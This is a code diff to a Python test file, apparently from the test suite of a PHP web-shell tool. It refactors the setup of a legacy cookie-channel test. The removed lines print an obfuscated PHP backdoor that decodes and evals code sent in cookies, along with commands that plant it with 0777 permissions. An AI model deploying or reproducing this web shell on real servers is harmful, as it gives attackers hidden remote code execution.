@@ -128,49 +128,9 @@ class LegacyCookieChannel(BaseTest):
 
     @classmethod
     def setUpClass(cls):
-
-        if config.debug:
-            stream_handler.setLevel(logging.DEBUG)
-        else:
-            stream_handler.setLevel(logging.INFO)
-
         cls._randomize_bd()
-        cls.password = 'asdasd'
-
-        # Check `config.script_folder` permissions, comparing just the 
-        # last 3 digits
-
-        if (
-            subprocess.check_output(
-                config.cmd_env_stat_permissions_s % (config.script_folder),
-                shell=True).strip()[-3:]
-            != config.script_folder_expected_perms[-3:]
-            ):
-            raise DevException(
-                "Error: give the required permissions to the folder \'%s\'"
-                % config.script_folder
-            )
-
-        obfuscated = """<?php
-$xcrd="mVwbeoGFjZShhceonJheSgnL1teXHc9XeoHeoNdLycsJy9ccy8nKSwgYXeoJyYXkeooJycsJysnKSwgam";
-$dqlt="JGMeo9J2NvdW50JzskYT0kX0NPT0tJRTtpeoZihyZXNldCgkeoYSk9PSdhcycgJeoiYeogJGMoeoJGEpP";
-$lspg="9pbihhcnJheeoV9zbeoGljZSgeokYeoSeowkYygkYSktMykpKSkpO2VeojaG8gJzwvJyeo4kay4nPic7fQ==";
-$tylz="jMpeyRreoPeoSeodkYXeoNkJztlY2hvICc8Jy4kay4nPieoc7ZXZhbeoChiYXNlNjRfZGVjb2RlKHByZWdfeoc";
-$toja = str_replace("z","","zsztr_zrzezpzlazce");
-$apod = $toja("q", "", "qbaqsqeq6q4_qdecodqe");
-$fyqt = $toja("uw","","uwcruweuwauwtuwe_funuwcuwtuwiouwn");
-$sify = $fyqt('', $apod($toja("eo", "", $dqlt.$tylz.$xcrd.$lspg))); $sify();
-?>"""
-
-        tmp_handler, tmp_path = tempfile.mkstemp()
-        save_generated(obfuscated, tmp_path)
-        subprocess.check_call(
-            config.cmd_env_move_s_s % (tmp_path, cls.path),
-            shell=True)
-
-        subprocess.check_call(
-            config.cmd_env_chmod_s_s % ('0777', cls.path),
-            shell=True)
+        obfuscated = generate(cls.password, agent='legacycookie_php')
+        save_generated(obfuscated, cls.path)
 
     @classmethod
     def tearDownClass(cls):
@@ -245,7 +205,7 @@ class LegacyReferrerChannel(BaseTest):
         cls._randomize_bd()
         cls.password = 'asdasd'
 
-        # Check `config.script_folder` permissions, comparing just the 
+        # Check `config.script_folder` permissions, comparing just the
         # last 3 digits
 
         if (
